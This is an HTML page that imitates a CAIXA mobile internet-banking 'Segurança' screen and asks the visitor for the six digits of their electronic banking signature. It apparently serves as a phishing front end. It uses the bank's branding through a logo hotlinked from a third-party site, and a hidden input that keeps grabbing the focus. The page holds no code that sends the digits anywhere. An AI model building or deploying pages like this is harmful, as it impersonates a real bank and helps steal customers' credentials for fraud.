<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CAIXA | Segurança</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f7f7f7;
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .phone-screen {
            width: 100%;
            max-width: 450px;
            height: 100vh;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .header-gradient {
            background: linear-gradient(180deg, #005ca9 0%, #004a87 100%);
        }

        /* Campos de dígito que agora mostram o número */
        .pin-field {
            width: 42px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 6px;
            border: 2px solid #ced4da;
            background-color: #f8f9fa;
            font-size: 1.5rem;
            font-weight: 700;
            color: #005ca9;
            transition: all 0.2s ease;
        }

        .pin-field.active {
            border-color: #f39200;
            background-color: #fff;
            box-shadow: 0 0 8px rgba(243, 146, 0, 0.2);
        }

        /* Input real invisível */
        #real-input {
            position: absolute;
            opacity: 0;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
        }

        .btn-confirmar {
            background-color: #f39200;
            color: white;
            font-weight: 700;
            text-transform: uppercase;
        }

        .btn-confirmar:disabled {
            background-color: #e0e0e0;
            color: #a0a0a0;
        }
    </style>
</head>
<body>

    <div class="phone-screen" onclick="document.getElementById('real-input').focus()">
        <div class="header-gradient text-white p-5 flex items-center shadow-md">
            <button class="mr-4"><i data-lucide="chevron-left" class="w-7 h-7"></i></button>
            <div class="flex-grow">
                <p class="text-[10px] uppercase opacity-70 font-bold tracking-widest">Internet Banking</p>
                <p class="text-lg font-medium">Validação</p>
            </div>
            <img src="https://logodownload.org/wp-content/uploads/2014/02/caixa-logo-1.png" alt="CAIXA" style="height: 24px; filter: brightness(0) invert(1);">
        </div>

        <div class="p-6">
            <h2 class="text-2xl font-bold text-[#005ca9] mb-2">Assinatura Eletrônica</h2>
            <p class="text-zinc-500 text-sm mb-8">Digite os 6 números da sua assinatura para confirmar.</p>

            <div class="flex flex-col items-center">
                <div class="flex justify-center gap-3 mb-10">
                    <div class="pin-field"></div>
                    <div class="pin-field"></div>
                    <div class="pin-field"></div>
                    <div class="pin-field"></div>
                    <div class="pin-field"></div>
                    <div class="pin-field"></div>
                </div>

                <input 
                    type="tel" 
                    id="real-input" 
                    maxlength="6" 
                    inputmode="numeric" 
                    autocomplete="off"
                    pattern="[0-9]*"
                    autofocus
                >
            </div>
        </div>

        <div class="p-6 mt-auto">
            <button id="btn-continue" disabled class="btn-confirmar w-full py-4 rounded-md shadow-lg">
                Confirmar
            </button>
        </div>
    </div>

    <script>
        lucide.createIcons();

        const realInput = document.getElementById('real-input');
        const fields = document.querySelectorAll('.pin-field');
        const btnContinue = document.getElementById('btn-continue');

        realInput.addEventListener('input', (e) => {
            // Remove qualquer coisa que não seja número
            let value = e.target.value.replace(/[^0-9]/g, '');
            e.target.value = value;
            
            fields.forEach((field, index) => {
                if (index < value.length) {
                    field.innerText = value[index]; // <--- AQUI FICA VISÍVEL
                    field.classList.add('active');
                } else {
                    field.innerText = ''; // Limpa se apagar
                    field.classList.remove('active');
                }
            });

            btnContinue.disabled = (value.length !== 6);
        });

        // Mantém o foco sempre ativo
        window.onload = () => setTimeout(() => realInput.focus(), 500);
        realInput.addEventListener('blur', () => setTimeout(() => realInput.focus(), 150));
    </script>
</body>
</html>
